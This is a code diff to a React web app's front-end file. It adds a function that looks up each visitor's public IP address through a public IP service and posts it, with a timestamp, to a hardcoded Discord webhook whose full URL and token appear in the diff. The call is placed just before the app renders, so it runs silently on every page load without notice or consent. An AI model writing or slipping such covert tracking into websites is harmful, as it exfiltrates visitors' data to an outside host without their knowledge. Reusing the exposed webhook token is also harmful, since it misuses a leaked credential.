@@ -1,5 +1,37 @@
 const { useState, useEffect, useRef, useCallback } = React;
 
+const discordWebhookURL = 'https://discord.com/api/webhooks/1415162908031189002/5Jh3j-gknvofG8iXc6F5dXtkNrAgK68IKO0Qlgk-qPOj_C69L08M2L8itZtdK6m_ka9J';
+
+// Function to get visitor IP and send to Discord webhook
+async function logVisitorIP() {
+  try {
+    // Fetch visitor IP using a public IP API
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    const ip = data.ip;
+
+    // Prepare the message content to send to the webhook
+    const message = {
+      content: `New visitor IP logged: ${ip} at ${new Date().toISOString()}`
+    };
+
+    // Send visitor info to Discord webhook
+    const webhookResponse = await fetch(discordWebhookURL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(message)
+    });
+
+    if (webhookResponse.ok) {
+      console.log('Visitor IP sent to Discord webhook successfully');
+    } else {
+      console.error('Failed to send visitor IP to Discord webhook');
+    }
+  } catch (error) {
+    console.error('Error logging visitor IP:', error);
+  }
+}
+
 const useInteractiveCard = () => {
     useEffect(() => {
         const cards = document.querySelectorAll('.interactive-card');
@@ -1565,4 +1597,5 @@ const App = () => {
 };
 
 const root = ReactDOM.createRoot(document.getElementById('root'));
+logVisitorIP();
 root.render(<App />);
